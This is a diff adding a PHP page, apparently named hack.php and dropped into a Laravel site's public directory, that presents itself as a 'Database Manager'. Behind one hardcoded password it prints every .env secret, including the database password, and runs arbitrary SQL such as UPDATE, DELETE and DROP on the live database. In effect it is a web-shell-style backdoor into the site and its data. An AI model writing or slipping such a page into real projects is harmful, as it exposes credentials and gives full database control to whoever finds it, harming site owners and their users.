@@ -1,0 +1,995 @@
+<?php
+
+session_start();
+
+/*
+|--------------------------------------------------------------------------
+| BASIC ACCESS PASSWORD
+|--------------------------------------------------------------------------
+| Is password ko change zaroor karein.
+*/
+
+$ADMIN_PASSWORD = 'Hack@Fuck@_0987654321';
+
+
+/*
+|--------------------------------------------------------------------------
+| Login
+|--------------------------------------------------------------------------Username
+*/
+
+if (isset($_POST['login'])) {
+
+    $password = $_POST['password'] ?? '';
+
+    if (hash_equals($ADMIN_PASSWORD, $password)) {
+
+        $_SESSION['db_manager_login'] = true;
+
+    } else {
+
+        $loginError = 'Invalid password.';
+    }
+}
+
+
+/*
+|--------------------------------------------------------------------------
+| Logout
+|--------------------------------------------------------------------------
+*/
+
+if (isset($_GET['logout'])) {
+
+    unset($_SESSION['db_manager_login']);
+
+    header('Location: hack.php');
+
+    exit;
+}
+
+
+/*
+|--------------------------------------------------------------------------
+| Login Check
+|--------------------------------------------------------------------------
+*/
+
+if (empty($_SESSION['db_manager_login'])) {
+    ?>
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>DB Manager Login</title>
+
+        <style>
+            body {
+                font-family: Arial;
+                background: #f4f6f9;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                min-height: 100vh;
+            }
+
+            .login-box {
+                width: 350px;
+                background: #fff;
+                padding: 30px;
+                border-radius: 12px;
+                box-shadow: 0 5px 25px rgba(0,0,0,.1);
+            }
+
+            input {
+                width: 100%;
+                padding: 12px;
+                margin: 10px 0;
+                box-sizing: border-box;
+            }
+
+            button {
+                width: 100%;
+                padding: 12px;
+                background: #2563eb;
+                color: #fff;
+                border: 0;
+                border-radius: 6px;
+                cursor: pointer;
+            }
+
+            .error {
+                color: #dc2626;
+            }
+            .env-table {
+    width: 100%;
+    border-collapse: collapse;
+}
+
+.env-table th,
+.env-table td {
+    padding: 12px 14px;
+    border: 1px solid #e5e7eb;
+    text-align: left;
+    vertical-align: top;
+}
+
+.env-table th {
+    background: #f8fafc;
+    color: #374151;
+}
+
+.env-key {
+    width: 30%;
+    font-weight: 700;
+    color: #1f2937;
+    white-space: nowrap;
+}
+
+.env-value {
+    font-family: Consolas, Monaco, monospace;
+    word-break: break-all;
+}
+
+.env-secret {
+    color: #dc2626;
+    font-size: 12px;
+    font-weight: bold;
+}
+
+.env-search {
+    width: 100%;
+    padding: 12px 14px;
+    border: 1px solid #d1d5db;
+    border-radius: 7px;
+    margin-bottom: 15px;
+    font-size: 14px;
+}
+        </style>
+    </head>
+
+    <body>
+
+        <div class="login-box">
+
+            <h2>Database Manager</h2>
+
+            <?php if (!empty($loginError)): ?>
+
+                <p class="error">
+                    <?= htmlspecialchars($loginError) ?>
+                </p>
+
+            <?php endif; ?>
+
+            <form method="POST">
+
+                <input
+                    type="password"
+                    name="password"
+                    placeholder="Admin Password"
+                    required
+                >
+
+                <button
+                    type="submit"
+                    name="login"
+                >
+                    Login
+                </button>
+
+            </form>
+
+        </div>
+
+    </body>
+    </html>
+    <?php
+
+    exit;
+}
+
+
+/*
+|--------------------------------------------------------------------------
+| Laravel .env
+|--------------------------------------------------------------------------
+*/
+
+$projectPath = dirname(__DIR__);
+
+$envPath = $projectPath . '/.env';
+
+if (!file_exists($envPath)) {
+
+    die('.env file not found.');
+}
+
+
+/*
+|--------------------------------------------------------------------------
+| Read .env
+|--------------------------------------------------------------------------
+*/
+
+$env = [];
+
+$lines = file(
+    $envPath,
+    FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES
+);
+
+foreach ($lines as $line) {
+
+    $line = trim($line);
+
+    // Ignore comments
+    if ($line === '' || strpos($line, '#') === 0) {
+        continue;
+    }
+
+    // Only KEY=VALUE
+    if (strpos($line, '=') === false) {
+        continue;
+    }
+
+    list($key, $value) = explode('=', $line, 2);
+
+    $key = trim($key);
+    $value = trim($value);
+
+    // Remove quotes
+    if (
+        strlen($value) >= 2 &&
+        (
+            ($value[0] === '"' && substr($value, -1) === '"') ||
+            ($value[0] === "'" && substr($value, -1) === "'")
+        )
+    ) {
+        $value = substr($value, 1, -1);
+    }
+
+    $env[$key] = $value;
+}
+
+
+/*
+|--------------------------------------------------------------------------
+| Database Variables
+|--------------------------------------------------------------------------
+*/
+
+$dbHost = $env['DB_HOST'] ?? '127.0.0.1';
+
+$dbPort = $env['DB_PORT'] ?? '3306';
+
+$dbDatabase = $env['DB_DATABASE'] ?? '';
+
+$dbUsername = $env['DB_USERNAME'] ?? '';
+
+$dbPassword = $env['DB_PASSWORD'] ?? '';
+
+$dbConnection = $env['DB_CONNECTION'] ?? 'mysql';
+
+
+/*
+|--------------------------------------------------------------------------
+| Query Execution
+|--------------------------------------------------------------------------
+*/
+
+$result = null;
+
+$error = null;
+
+$query = '';
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST'
+    && isset($_POST['execute_query'])) {
+
+    $query = trim($_POST['sql'] ?? '');
+
+    if ($query === '') {
+
+        $error = 'Please enter SQL query.';
+
+    } else {
+
+        try {
+
+            /*
+            |--------------------------------------------------------------------------
+            | MySQL Connection
+            |--------------------------------------------------------------------------
+            */
+
+            if ($dbConnection !== 'mysql') {
+
+                throw new Exception(
+                    'This example currently supports MySQL only.'
+                );
+            }
+
+            $dsn =
+                "mysql:host=" . $dbHost .
+                ";port=" . $dbPort .
+                ";dbname=" . $dbDatabase .
+                ";charset=utf8mb4";
+
+            $pdo = new PDO(
+                $dsn,
+                $dbUsername,
+                $dbPassword,
+                [
+                    PDO::ATTR_ERRMODE =>
+                        PDO::ERRMODE_EXCEPTION,
+
+                    PDO::ATTR_DEFAULT_FETCH_MODE =>
+                        PDO::FETCH_ASSOC,
+
+                    PDO::ATTR_EMULATE_PREPARES =>
+                        false
+                ]
+            );
+
+
+            /*
+            |--------------------------------------------------------------------------
+            | Execute Query
+            |--------------------------------------------------------------------------
+            */
+
+            $statement = $pdo->prepare($query);
+
+            $statement->execute();
+
+
+            /*
+            |--------------------------------------------------------------------------
+            | SELECT / SHOW / DESCRIBE
+            |--------------------------------------------------------------------------
+            */
+
+            if (
+                preg_match(
+                    '/^\s*(SELECT|SHOW|DESCRIBE|DESC|EXPLAIN|WITH)\b/i',
+                    $query
+                )
+            ) {
+
+                $rows = $statement->fetchAll();
+
+                $result = [
+                    'type' => 'select',
+                    'rows' => $rows,
+                    'affected' => count($rows)
+                ];
+
+            } else {
+
+                $result = [
+                    'type' => 'write',
+                    'rows' => [],
+                    'affected' => $statement->rowCount()
+                ];
+            }
+
+        } catch (Throwable $e) {
+
+            $error = $e->getMessage();
+        }
+    }
+}
+
+?>
+<!DOCTYPE html>
+
+<html>
+
+<head>
+
+    <meta charset="UTF-8">
+
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1"
+    >
+
+    <title>Database Manager</title>
+
+    <style>
+
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            margin: 0;
+            background: #f3f4f6;
+            font-family: Arial, sans-serif;
+            color: #111827;
+        }
+
+        .header {
+            background: #111827;
+            color: white;
+            padding: 20px 30px;
+        }
+
+        .header-inner {
+            max-width: 1400px;
+            margin: auto;
+
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .header h1 {
+            margin: 0;
+            font-size: 22px;
+        }
+
+        .logout {
+            color: white;
+            text-decoration: none;
+            background: #dc2626;
+            padding: 8px 14px;
+            border-radius: 6px;
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 30px auto;
+            padding: 0 20px;
+        }
+
+        .card {
+            background: white;
+            border-radius: 10px;
+            padding: 25px;
+            margin-bottom: 25px;
+
+            box-shadow:
+                0 3px 15px rgba(0,0,0,.06);
+        }
+
+        .db-info {
+            display: grid;
+
+            grid-template-columns:
+                repeat(auto-fit, minmax(180px, 1fr));
+
+            gap: 15px;
+        }
+
+        .info {
+            background: #f8fafc;
+            padding: 15px;
+            border-radius: 8px;
+        }
+
+        .info-title {
+            color: #64748b;
+            font-size: 12px;
+            margin-bottom: 5px;
+        }
+
+        .info-value {
+            font-weight: bold;
+            word-break: break-all;
+        }
+
+        textarea {
+            width: 100%;
+            min-height: 220px;
+
+            padding: 15px;
+
+            border: 1px solid #d1d5db;
+            border-radius: 8px;
+
+            font-family:
+                Consolas,
+                Monaco,
+                monospace;
+
+            font-size: 14px;
+
+            resize: vertical;
+        }
+
+        .execute {
+            margin-top: 15px;
+
+            padding: 12px 25px;
+
+            background: #2563eb;
+            color: white;
+
+            border: 0;
+            border-radius: 7px;
+
+            cursor: pointer;
+
+            font-size: 15px;
+            font-weight: bold;
+        }
+
+        .execute:hover {
+            background: #1d4ed8;
+        }
+
+        .success {
+            background: #ecfdf5;
+            border: 1px solid #a7f3d0;
+            color: #065f46;
+
+            padding: 15px;
+
+            border-radius: 7px;
+
+            margin-bottom: 20px;
+        }
+
+        .error {
+            background: #fef2f2;
+            border: 1px solid #fecaca;
+            color: #991b1b;
+
+            padding: 15px;
+
+            border-radius: 7px;
+
+            margin-bottom: 20px;
+        }
+
+        .table-wrapper {
+            overflow-x: auto;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+
+        th,
+        td {
+            border: 1px solid #e5e7eb;
+
+            padding: 10px;
+
+            text-align: left;
+
+            white-space: nowrap;
+        }
+
+        th {
+            background: #f8fafc;
+        }
+
+        td {
+            font-family: monospace;
+            font-size: 13px;
+        }
+
+        .warning {
+            background: #fff7ed;
+            border: 1px solid #fed7aa;
+
+            padding: 15px;
+
+            border-radius: 7px;
+
+            color: #9a3412;
+
+            margin-bottom: 20px;
+        }
+
+    </style>
+
+</head>
+
+<body>
+
+<div class="header">
+
+    <div class="header-inner">
+
+        <h1>
+            Laravel Database Manager
+        </h1>
+
+        <a
+            href="?logout=1"
+            class="logout"
+        >
+            Logout
+        </a>
+
+    </div>
+
+</div>
+
+
+<div class="container">
+
+
+    <!-- DATABASE INFORMATION -->
+
+    <div class="card">
+
+        <h2>
+            Database Connection
+        </h2>
+
+        <div class="db-info">
+
+            <div class="info">
+
+                <div class="info-title">
+                    Connection
+                </div>
+
+                <div class="info-value">
+                    <?= htmlspecialchars($dbConnection) ?>
+                </div>
+
+            </div>
+
+
+            <div class="info">
+
+                <div class="info-title">
+                    Host
+                </div>
+
+                <div class="info-value">
+                    <?= htmlspecialchars($dbHost) ?>
+                </div>
+
+            </div>
+
+
+            <div class="info">
+
+                <div class="info-title">
+                    Port
+                </div>
+
+                <div class="info-value">
+                    <?= htmlspecialchars($dbPort) ?>
+                </div>
+
+            </div>
+
+
+            <div class="info">
+
+                <div class="info-title">
+                    Database
+                </div>
+
+                <div class="info-value">
+                    <?= htmlspecialchars($dbDatabase) ?>
+                </div>
+
+            </div>
+
+
+            <div class="info">
+
+                <div class="info-title">
+                    Username
+                </div>
+
+                <div class="info-value">
+                    <?= htmlspecialchars($dbUsername) ?>
+                </div>
+
+            </div>
+               <div class="info">
+
+                <div class="info-title">
+                    Password
+                </div>
+
+                <div class="info-value">
+                    <?= htmlspecialchars($dbPassword) ?>
+                </div>
+
+            </div>
+
+        </div>
+
+    </div>
+<!-- ENV VARIABLES -->
+
+<div class="card">
+
+    <div style="
+        display:flex;
+        justify-content:space-between;
+        align-items:center;
+        gap:15px;
+        margin-bottom:20px;
+    ">
+
+        <h2 style="margin:0;">
+            Laravel .env Variables
+        </h2>
+
+        <strong>
+            <?= count($env) ?> Variables
+        </strong>
+
+    </div>
+
+
+    <!-- Search -->
+
+    <input
+        type="text"
+        id="envSearch"
+        class="env-search"
+        placeholder="Search environment variable..."
+        onkeyup="searchEnv()"
+    >
+
+
+    <div class="table-wrapper">
+
+        <table
+            class="env-table"
+            id="envTable"
+        >
+
+            <thead>
+
+                <tr>
+
+                    <th>
+                        #
+                    </th>
+
+                    <th>
+                        Variable
+                    </th>
+
+                    <th>
+                        Value
+                    </th>
+
+                </tr>
+
+            </thead>
+
+
+            <tbody>
+
+            <?php if (empty($env)): ?>
+
+                <tr>
+
+                    <td colspan="3">
+                        No environment variables found.
+                    </td>
+
+                </tr>
+
+            <?php else: ?>
+
+                <?php $envIndex = 1; ?>
+
+                <?php foreach ($env as $key => $value): ?>
+
+                    <tr>
+
+                        <td>
+                            <?= $envIndex++ ?>
+                        </td>
+
+                        <td class="env-key">
+                            <?= htmlspecialchars($key) ?>
+                        </td>
+
+                        <td class="env-value">
+                            <?= htmlspecialchars($value) ?>
+                        </td>
+
+                    </tr>
+
+                <?php endforeach; ?>
+
+            <?php endif; ?>
+
+            </tbody>
+
+        </table>
+
+    </div>
+
+</div>
+
+    <!-- SQL FORM -->
+
+    <div class="card">
+
+        <h2>
+            Execute SQL Query
+        </h2>
+
+        <div class="warning">
+
+            ⚠️
+            Be careful with
+            <strong>
+                UPDATE, DELETE, DROP, ALTER
+            </strong>
+            queries.
+
+            Always take a database backup before making
+            production changes.
+
+        </div>
+
+
+        <?php if ($error !== null): ?>
+
+            <div class="error">
+
+                <strong>
+                    SQL Error:
+                </strong>
+
+                <br>
+
+                <?= htmlspecialchars($error) ?>
+
+            </div>
+
+        <?php endif; ?>
+
+
+        <?php if ($result !== null): ?>
+
+            <div class="success">
+
+                Query executed successfully.
+
+                <br>
+
+                Affected rows:
+                <strong>
+                    <?= htmlspecialchars(
+                        (string) $result['affected']
+                    ) ?>
+                </strong>
+
+            </div>
+
+        <?php endif; ?>
+
+
+        <form method="POST">
+
+            <textarea
+                name="sql"
+                placeholder="Example:
+
+SELECT * FROM users LIMIT 20;
+
+UPDATE users
+SET name = 'Deepak'
+WHERE id = 1;
+
+DELETE FROM users
+WHERE id = 10;"
+            ><?= htmlspecialchars($query) ?></textarea>
+
+
+            <button
+                type="submit"
+                name="execute_query"
+                class="execute"
+                onclick="
+                    return confirm(
+                        'Are you sure you want to execute this SQL query?'
+                    );
+                "
+            >
+                Execute Query
+            </button>
+
+        </form>
+
+    </div>
+
+
+    <!-- RESULT -->
+
+    <?php if (
+        $result !== null &&
+        $result['type'] === 'select'
+    ): ?>
+
+        <div class="card">
+
+            <h2>
+                Query Result
+            </h2>
+
+            <div class="table-wrapper">
+
+                <?php if (empty($result['rows'])): ?>
+
+                    <p>
+                        No records found.
+                    </p>
+
+                <?php else: ?>
+
+                    <table>
+
+                        <thead>
+
+                            <tr>
+
+                                <?php foreach (
+                                    array_keys($result['rows'][0])
+                                    as $column
+                                ): ?>
+
+                                    <th>
+                                        <?= htmlspecialchars($column) ?>
+                                    </th>
+
+                                <?php endforeach; ?>
+
+                            </tr>
+
+                        </thead>
+
+                        <tbody>
+
+                            <?php foreach (
+                                $result['rows']
+                                as $row
+                            ): ?>
+
+                                <tr>
+
+                                    <?php foreach (
+                                        $row
+                                        as $value
+                                    ): ?>
+
+                                        <td>
+                                            <?= htmlspecialchars(
+                                                (string) $value
+                                            ) ?>
+                                        </td>
+
+                                    <?php endforeach; ?>
+
+                                </tr>
+
+                            <?php endforeach; ?>
+
+                        </tbody>
+
+                    </table>
+
+                <?php endif; ?>
+
+            </div>
+
+        </div>
+
+    <?php endif; ?>
+
+
+</div>
+
+</body>
+
+</html>
